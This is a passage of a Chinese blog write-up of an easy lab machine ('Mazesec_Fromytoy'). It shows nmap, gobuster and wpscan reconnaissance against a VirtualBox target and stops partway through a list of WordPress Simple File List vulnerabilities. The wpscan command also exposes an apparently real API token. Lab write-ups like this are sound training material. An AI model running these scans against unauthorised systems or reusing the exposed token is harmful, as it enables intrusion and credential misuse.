@@ -1,0 +1,812 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Miao">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="靶机来源：QQ群-660930334 难度：Easy">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Mazesec_Fromytoy">
+<meta property="og:url" content="http://miao-sec.github.io/Maze-sec/Mazesec-Fromytoy/index.html">
+<meta property="og:site_name" content="Miao Blog">
+<meta property="og:description" content="靶机来源：QQ群-660930334 难度：Easy">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2026-02-04T03:46:28.000Z">
+<meta property="article:modified_time" content="2026-03-11T06:46:45.451Z">
+<meta property="article:author" content="Miao">
+<meta property="article:tag" content="Wordpress">
+<meta property="article:tag" content="Simple File List">
+<meta property="article:tag" content="Suid_rev">
+<meta property="article:tag" content="pycache投毒">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>Mazesec_Fromytoy - Miao Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/glassBg.css">
+<link rel="stylesheet" href="/css/macBorder.css">
+<link rel="stylesheet" href="/css/scrollAnimation.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"miao-sec.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"|","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"#"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":"flase"},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"https://miaorj.oss-cn-chengdu.aliyuncs.com/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"W5UPQ7BHtxFTBIoh5xr1UWMt-gzGzoHsz","app_key":"WEHCtPWZ5dJRfC1hhVipHKwQ","server_url":"https://w5upq7bh.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body><!-- hexo injector body_begin start --><div id="web_bg"></div><!-- hexo injector body_begin end -->
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav
+  id="navbar"
+  class="navbar fixed-top navbar-expand-lg navbar-dark scrolling-navbar"
+>
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong class="navbar-title"
+        >Miaosec</strong
+      >
+    </a>
+
+    <button
+      id="navbar-toggler-btn"
+      class="navbar-toggler"
+      type="button"
+      data-toggle="collapse"
+      data-target="#navbarSupportedContent"
+      aria-controls="navbarSupportedContent"
+      aria-expanded="false"
+      aria-label="Toggle navigation"
+    >
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+            
+        <li class="nav-item">
+          <a
+            class="nav-link"
+            href="/"
+            target="_self"
+          >
+            <i class="iconfont icon-home-fill"></i>
+            <span>首页</span>
+          </a>
+        </li>
+             
+        <li class="nav-item">
+          <a
+            class="nav-link"
+            href="/archives/"
+            target="_self"
+          >
+            <i class="iconfont icon-archive-fill"></i>
+            <span>归档</span>
+          </a>
+        </li>
+             
+        <li class="nav-item">
+          <a
+            class="nav-link"
+            href="/categories/"
+            target="_self"
+          >
+            <i class="iconfont icon-category-fill"></i>
+            <span>分类</span>
+          </a>
+        </li>
+             
+        <li class="nav-item">
+          <a
+            class="nav-link"
+            href="/tags/"
+            target="_self"
+          >
+            <i class="iconfont icon-tags-fill"></i>
+            <span>标签</span>
+          </a>
+        </li>
+          
+        <li class="nav-item" id="search-btn">
+          <a
+            class="nav-link"
+            target="_self"
+            href="javascript:;"
+            data-toggle="modal"
+            data-target="#modalSearch"
+            aria-label="Search"
+          >
+            <i class="iconfont icon-search"></i>
+          </a>
+        </li>
+          
+        <li class="nav-item" id="color-toggle-btn">
+          <a
+            class="nav-link"
+            target="_self"
+            href="javascript:;"
+            aria-label="Color Toggle"
+          >
+            <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+          </a>
+        </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Mazesec_Fromytoy"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-02-04 11:46" pubdate>
+          2026年2月4日 中午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          3.3k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          28 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Mazesec_Fromytoy</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>靶机来源：QQ群-<code>660930334</code></p>
+<p>难度：Easy</p>
+<span id="more"></span>
+
+<h1 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h1><h2 id="1、主机探测"><a href="#1、主机探测" class="headerlink" title="1、主机探测"></a>1、主机探测</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec]<br>└─# nmap -sn 192.168.2.0/24<br>Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-02 16:31 +0800<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.1<br>Host is up (0.00072s latency).<br>MAC Address: 0A:00:27:00:00:07 (Unknown)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.2<br>Host is up (0.00060s latency).<br>MAC Address: 08:00:27:48:23:C1 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.67<br>Host is up (0.00053s latency).<br>MAC Address: 08:00:27:F9:7B:3D (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.4<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="hljs-keyword">in</span> 7.54 seconds<br></code></pre></td></tr></table></figure>
+
+<p>靶机IP：<code>192.168.2.67</code></p>
+<h2 id="2、端口扫描"><a href="#2、端口扫描" class="headerlink" title="2、端口扫描"></a>2、端口扫描</h2><h3 id="1-全端口扫描"><a href="#1-全端口扫描" class="headerlink" title="1.全端口扫描"></a>1.全端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec]<br>└─# nmap --min-rate 10000 -p- 192.168.2.67<br>Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-02 16:31 +0800<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.67<br>Host is up (0.0022s latency).<br>Not shown: 65532 closed tcp ports (reset)<br>PORT     STATE SERVICE<br>22/tcp   open  ssh<br>80/tcp   open  http<br>3000/tcp open  ppp<br>MAC Address: 08:00:27:F9:7B:3D (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 8.93 seconds<br></code></pre></td></tr></table></figure>
+
+<p>开放端口：<code>22、80、3000</code></p>
+<h3 id="2-详细信息扫描"><a href="#2-详细信息扫描" class="headerlink" title="2.详细信息扫描"></a>2.详细信息扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec]<br>└─# nmap --min-rate 10000 -sT -sC -sV -O -p22,80,3000 192.168.2.67<br>Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-02 16:32 +0800<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.67<br>Host is up (0.00082s latency).<br><br>PORT     STATE SERVICE VERSION<br>22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)<br>| ssh-hostkey: <br>|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)<br>|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)<br>|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)<br>80/tcp   open  http    Apache httpd 2.4.62 ((Debian))<br>|_http-title: Site doesn<span class="hljs-string">&#x27;t have a title (text/html).</span><br><span class="hljs-string">|_http-server-header: Apache/2.4.62 (Debian)</span><br><span class="hljs-string">3000/tcp open  http    Apache httpd 2.4.51 ((Debian))</span><br><span class="hljs-string">|_http-title: VOCALOID NEXUS &amp;#8211; The Cyber-Digital Soul Archive</span><br><span class="hljs-string">| http-robots.txt: 1 disallowed entry </span><br><span class="hljs-string">|_/wp-admin/</span><br><span class="hljs-string">|_http-generator: WordPress 6.9</span><br><span class="hljs-string">|_http-server-header: Apache/2.4.51 (Debian)</span><br><span class="hljs-string">MAC Address: 08:00:27:F9:7B:3D (Oracle VirtualBox virtual NIC)</span><br><span class="hljs-string">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="hljs-string">Device type: general purpose|router</span><br><span class="hljs-string">Running: Linux 4.X|5.X, MikroTik RouterOS 7.X</span><br><span class="hljs-string">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3</span><br><span class="hljs-string">OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)</span><br><span class="hljs-string">Network Distance: 1 hop</span><br><span class="hljs-string">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="hljs-string"></span><br><span class="hljs-string">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 21.56 seconds</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="3-udp扫描"><a href="#3-udp扫描" class="headerlink" title="3.udp扫描"></a>3.udp扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec]<br>└─# nmap -sU --top-ports 100 192.168.2.67                         <br>Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-02 16:33 +0800<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.67<br>Host is up (0.00074s latency).<br>All 100 scanned ports on 192.168.2.67 are <span class="hljs-keyword">in</span> ignored states.<br>Not shown: 60 closed udp ports (port-unreach), 40 open|filtered udp ports (no-response)<br>MAC Address: 08:00:27:F9:7B:3D (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 60.21 seconds<br></code></pre></td></tr></table></figure>
+
+<h1 id="二、WEB渗透"><a href="#二、WEB渗透" class="headerlink" title="二、WEB渗透"></a>二、WEB渗透</h1><h2 id="1、HTTP-服务"><a href="#1、HTTP-服务" class="headerlink" title="1、HTTP 服务"></a>1、HTTP 服务</h2><p>访问80端口，没发现有用的信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec]<br>└─# curl http://192.168.2.67<br>index<br></code></pre></td></tr></table></figure>
+
+<h2 id="2、目录扫描"><a href="#2、目录扫描" class="headerlink" title="2、目录扫描"></a>2、目录扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec]<br>└─# gobuster <span class="hljs-built_in">dir</span> -u http://192.168.2.67 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,js,txt,bak<br>===============================================================<br>Gobuster v3.8.2<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.2.67<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.8.2<br>[+] Extensions:              txt,bak,php,html,js<br>[+] Timeout:                 10s<br>===============================================================<br>Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>index.html           (Status: 200) [Size: 6]<br>server-status        (Status: 403) [Size: 277]<br></code></pre></td></tr></table></figure>
+
+<h1 id="三、Simple-File-List"><a href="#三、Simple-File-List" class="headerlink" title="三、Simple File List"></a>三、Simple File List</h1><p>访问3000端口，发现cms是<code>wordpress</code> 使用wpscan进行扫描</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec]<br>└─# wpscan --url http://192.168.2.67:3000 --api-token Jrh7ozpao7LtkyqVZwMeXCKeqJN0zHplyeG8SaQU124 -e u,vp<br>_______________________________________________________________<br>         __          _______   _____<br>         \ \        / /  __ \ / ____|<br>          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®<br>           \ \/  \/ / |  ___/ \___ \ / __|/ _` | _ \<br>            \  /\  /  | |     ____) | (__| (_| | | | |<br>             \/  \/   |_|    |_____/ \___|\__,_|_| |_|<br><br>         WordPress Security Scanner by the WPScan Team<br>                         Version 3.8.28<br>       Sponsored by Automattic - https://automattic.com/<br>       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart<br>_______________________________________________________________<br><br>[+] URL: http://192.168.2.67:3000/ [192.168.2.67]<br>[+] Started: Tue Feb  3 10:35:45 2026<br><br>Interesting Finding(s):<br><br>[+] Headers<br> | Interesting Entries:<br> |  - Server: Apache/2.4.51 (Debian)<br> |  - X-Powered-By: PHP/7.4.27<br> | Found By: Headers (Passive Detection)<br> | Confidence: 100%<br><br>[+] robots.txt found: http://192.168.2.67:3000/robots.txt<br> | Interesting Entries:<br> |  - /wp-admin/<br> |  - /wp-admin/admin-ajax.php<br> | Found By: Robots Txt (Aggressive Detection)<br> | Confidence: 100%<br><br>[+] XML-RPC seems to be enabled: http://192.168.2.67:3000/xmlrpc.php<br> | Found By: Direct Access (Aggressive Detection)<br> | Confidence: 100%<br> | References:<br> |  - http://codex.wordpress.org/XML-RPC_Pingback_API<br> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/<br> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/<br> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/<br> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/<br><br>[+] WordPress readme found: http://192.168.2.67:3000/readme.html<br> | Found By: Direct Access (Aggressive Detection)<br> | Confidence: 100%<br><br>[+] The external WP-Cron seems to be enabled: http://192.168.2.67:3000/wp-cron.php<br> | Found By: Direct Access (Aggressive Detection)<br> | Confidence: 60%<br> | References:<br> |  - https://www.iplocation.net/defend-wordpress-from-ddos<br> |  - https://github.com/wpscanteam/wpscan/issues/1299<br><br>[+] WordPress version 6.9 identified (Latest, released on 2025-12-02).<br> | Found By: Rss Generator (Passive Detection)<br> |  - http://192.168.2.67:3000/feed/, &lt;generator&gt;https://wordpress.org/?v=6.9&lt;/generator&gt;<br> |  - http://192.168.2.67:3000/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=6.9&lt;/generator&gt;<br><br>[+] WordPress theme <span class="hljs-keyword">in</span> use: twentytwentyone<br> | Location: http://192.168.2.67:3000/wp-content/themes/twentytwentyone/<br> | Last Updated: 2025-12-03T00:00:00.000Z<br> | Readme: http://192.168.2.67:3000/wp-content/themes/twentytwentyone/readme.txt<br> | [!] The version is out of <span class="hljs-built_in">date</span>, the latest version is 2.7<br> | Style URL: http://192.168.2.67:3000/wp-content/themes/twentytwentyone/style.css?ver=1.4<br> | Style Name: Twenty Twenty-One<br> | Style URI: https://wordpress.org/themes/twentytwentyone/<br> | Description: Twenty Twenty-One is a blank canvas <span class="hljs-keyword">for</span> your ideas and it makes the block editor your best brush. Wi...<br> | Author: the WordPress team<br> | Author URI: https://wordpress.org/<br> |<br> | Found By: Css Style In Homepage (Passive Detection)<br> | Confirmed By: Css Style In 404 Page (Passive Detection)<br> |<br> | Version: 1.4 (80% confidence)<br> | Found By: Style (Passive Detection)<br> |  - http://192.168.2.67:3000/wp-content/themes/twentytwentyone/style.css?ver=1.4, Match: <span class="hljs-string">&#x27;Version: 1.4&#x27;</span><br><br>[+] Enumerating Vulnerable Plugins (via Passive Methods)<br>[+] Checking Plugin Versions (via Passive and Aggressive Methods)<br><br>[i] Plugin(s) Identified:<br><br>[+] simple-file-list<br> | Location: http://192.168.2.67:3000/wp-content/plugins/simple-file-list/<br> | Last Updated: 2026-01-29T20:30:00.000Z<br> | [!] The version is out of <span class="hljs-built_in">date</span>, the latest version is 6.1.18<br> |<br> | Found By: Urls In Homepage (Passive Detection)<br> | Confirmed By: Urls In 404 Page (Passive Detection)<br> |<br> | [!] 12 vulnerabilities identified:<br> |<br> | [!] Title: Simple File List &lt; 4.2.3 - Unauthenticated Arbitrary File Upload RCE<br> |     Fixed <span class="hljs-keyword">in</span>: 4.2.3<br> |     References:<br> |      - https://wpscan.com/vulnerability/365da9c5-a8d0-45f6-863c-1b1926ffd574<br> |      - https://simplefilelist.com/<br> |      - https://plugins.trac.wordpress.org/changeset/2286920/simple-file-list<br> |      - https://packetstormsecurity.com/files/160221/<br> |<br> | [!] Title: Simple File List &lt; 4.2.8 - Authenticated Arbitrary File Deletion<br> |     Fixed <span class="hljs-keyword">in</span>: 4.2.8<br> |     References:<br> |      - https://wpscan.com/vulnerability/422360b9-4c70-4fd9-9833-375f1294bd7a<br> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-12832<br> |      - https://ctulhu.me/2020/05/16/cve-2020-12832/<br> |<br> | [!] Title: Simple File List &lt; 4.4.12 - Reflected Cross-Site Scripting<br> |     Fixed <span class="hljs-keyword">in</span>: 4.4.12<br> |     References:<br> |      - https://wpscan.com/vulnerability/2e829bbe-1843-496d-a852-4150fa6d1f7a<br> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-3062<br> |<br> | [!] Title: Simple File List &lt; 4.4.13 - Page Creation via CSRF<br> |     Fixed <span class="hljs-keyword">in</span>: 4.4.13<br> |     References:<br> |      - https://wpscan.com/vulnerability/80d475ca-b475-4789-8eef-9c4d880853b7<br> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-3208<br> |<br> | [!] Title: Simple File List &lt; 4.4.12 - Admin+ Stored Cross-Site Scripting<br> |     Fixed <span class="hljs-keyword">in</span>: 4.4.12<br> |     References:<br> |      - https://wpscan.com/vulnerability/b57272ea-9a8a-482a-bbaa-5f202ca5b9aa<br> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-3207<br> |<br> | [!] Title: Simple File List &lt; 6.0.10 - Admin+ Stored XSS<br> |     Fixed <span class="hljs-keyword">in</span>: 6.0.10<br> |     References:<br> |      - https://wpscan.com/vulnerability/13621b13-8d31-4214-a665-cb15981f3ec1<br> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-1025<br> |<br> | [!] Title: Simple File List &lt; 6.1.10 - Admin+ Stored XSS<br> |     Fixed <span class="hljs-keyword">in</span>: 6.1.10<br> |     References:<br> |      - 